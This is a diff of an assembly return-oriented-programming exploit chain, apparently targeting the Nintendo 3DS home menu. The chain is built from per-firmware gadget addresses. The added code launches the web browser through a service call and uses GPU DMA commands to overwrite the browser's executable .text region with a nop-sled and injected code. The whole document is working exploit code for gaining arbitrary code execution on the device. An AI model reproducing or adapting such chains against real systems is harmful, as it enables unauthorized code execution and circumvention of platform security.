@@ -92,9 +92,54 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define SRV_GETSERVICEHANDLE 0x00212e48
 
 #define GXLOW_CMD4 0x0014d604
+
+#define NSS_LaunchTitle 0x0020e6a8
+#endif
+
+#if SYSVER == 94
+#define NSS_LaunchTitle 0x0022022c //inr0=procid out* inr1=unused inr2/inr3=u64 programid insp0=u8 mediatype
+#endif
+
+#if SYSVER == 93
+#define NSS_LaunchTitle 0x0022024c
+#endif
+
+#if SYSVER == 92
+#define NSS_LaunchTitle 0x0020e640
 #endif
 
 #define ROP_BXR1 POP_R4LR_BXR1+4
+
+
+.macro CALL_GXCMD4 srcadr, dstadr, cpysize
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word POP_R4LR_BXR1
+.word 0 @ r4
+.word POP_R2R6PC @ lr
+
+.word POP_R0PC
+.word \srcadr @ r0
+
+.word POP_R1PC
+.word \dstadr @ r1
+
+.word POP_R2R6PC
+.word \cpysize @ r2, size
+.word 0 @ r3, width0
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word GXLOW_CMD4
+
+.word 0 @ r2 / sp0 (height0)
+.word 0 @ r3 / sp4 (width1)
+.word 0 @ r4 / sp8 (height1)
+.word 0x8 @ r5 / sp12 (flags)
+.word 0 @ r6
+.endm
 
 _start:
 
@@ -140,6 +185,10 @@ vtable:
 .space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
 
 ropstackstart:
+
+//Overwrite the top-screen framebuffers.
+CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
+
 .word POP_R1PC
 .word ROP_POPPC @ r1
 
@@ -148,25 +197,42 @@ ropstackstart:
 .word POP_R2R6PC @ lr
 
 .word POP_R0PC
-.word 0x1f000000 @ r0, src (VRAM+0)
+.word HEAPBUF @ r0, out procid*
 
-.word POP_R1PC
-.word 0x1f1e6000 @ r1, dst (top-screen framebuffers in VRAM)
+@ r1 isn't used by NSS_LaunchTitle so no need to set it here.
 
 .word POP_R2R6PC
-.word 0x46800*2 @ r2, size
-.word 0 @ r3, width0
+.word 0x00009402 @ r2, programID low
+.word 0x00040030 @ r3, programID high
 .word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
 
-.word GXLOW_CMD4
+.word NSS_LaunchTitle @ Launch the web-browser. The above programID is currently hardcoded for the Old3DS USA browser.
 
-.word 0 @ r2 / sp0 (height0)
-.word 0 @ r3 / sp4 (width1)
-.word 0 @ r4 / sp8 (height1)
-.word 0x8 @ r5 / sp12 (flags)
+.word 0 @ r2 / sp0 (mediatype, 0=NAND)
+.word 0 @ r3
+.word 0 @ r4
+.word 0 @ r5
 .word 0 @ r6
+
+//Overwrite the start of the browser .text with the below code.
+CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), 0x36500000, (codedataend-codedatastart)
+
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word POP_R4LR_BXR1
+.word 0 @ r4
+.word ROP_POPPC @ lr
+
+.word POP_R0PC
+.word 0x0 @ r0
+
+.word POP_R1PC
+.word 0x100 @ r1
+
+.word SVCSLEEPTHREAD @ Sleep 10 seconds. When the browser main-thread starts running, it runs for a while then stop running due to a context-switch triggered during .bss clearing. This allows that thread to resume running, at that point the code which was running(.bss clearing) would be already overwritten by the below code(initially it would execute the nop-sled).
 
 .word POP_R1PC
 .word ROP_BXR1 @ r1
@@ -174,4 +240,16 @@ ropstackstart:
 .word ROP_BXR1 @ This is used as an infinite loop.
 
 .word 0x58584148
+
+.align 3
+codedatastart:
+.space 0x200 @ nop-sled
+ldr r0, =0x58584148
+ldr r0, [r0]
+code_end:
+b code_end
+.pool
+
+.align 3
+codedataend:
 
